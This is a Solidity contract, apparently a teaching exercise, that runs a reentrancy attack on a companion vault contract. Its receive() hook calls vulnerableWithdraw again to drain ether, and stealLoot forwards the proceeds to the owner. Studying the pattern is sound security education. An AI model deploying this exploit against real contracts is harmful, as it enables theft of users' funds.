// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {//接口调用GoldVault合约
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief{
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress){
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;

    }

    function attackVulnerable() external payable{
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.vulnerableWithdraw();

    }

    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.safeWithdraw();
    }

    receive () external payable {
        attackCount++;

        if(!attackingSafe && address(targetVault).balance >= 1 ether && attackCount <5){
            targetVault.vulnerableWithdraw();

        }

        if (attackingSafe){
            targetVault.safeWithdraw();
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
        //对于普通钱包，非智能合约来说用transfer足够，接收ETH不许呀消耗Gas，因为普通钱包没有嗲嘛， 也就没有receive或fallback函数
        

    }

    function getBalance() external view returns (uint256){
        return address(this).balance;
    }



}